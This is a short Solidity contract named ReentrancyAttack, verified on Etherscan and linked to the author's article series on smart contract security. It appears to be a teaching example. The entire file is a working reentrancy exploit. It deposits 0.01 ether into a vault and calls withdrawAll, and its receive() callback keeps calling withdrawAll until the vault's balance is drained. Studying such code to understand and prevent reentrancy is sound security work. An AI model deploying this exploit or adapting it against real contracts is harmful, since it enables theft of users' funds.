/**
 *Submitted for verification at Etherscan.io on 2022-12-15
*/

// SPDX-License-Identifier: BSL-1.0 (Boost Software License 1.0)

//--------------------------------------------------------------------------//
// Copyright 2022 serial-coder: Phuwanai Thummavet ([email protected]) //
//--------------------------------------------------------------------------//

// For more info, please refer to my article:
//  - On Medium: https://medium.com/valixconsulting/solidity-smart-contract-security-by-example-02-reentrancy-b0c08cfcd555
//  - On serial-coder.com: https://www.serial-coder.com/post/solidity-smart-contract-security-by-example-02-reentrancy/

pragma solidity 0.8.13;

interface IEtherVault {
    function deposit() external payable;
    function withdrawAll() external;
}

contract ReentrancyAttack {
    IEtherVault public immutable etherVault;

    constructor(IEtherVault _etherVault) {
        etherVault = _etherVault;
    }
    
    receive() external payable {
        if (address(etherVault).balance >= 0.01 ether) {
            etherVault.withdrawAll();
        }
    }

    function attack() external payable {
        require(msg.value == 0.01 ether, "Require 0.01 Ether to attack");
        etherVault.deposit{value: 0.01 ether}();
        etherVault.withdrawAll();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}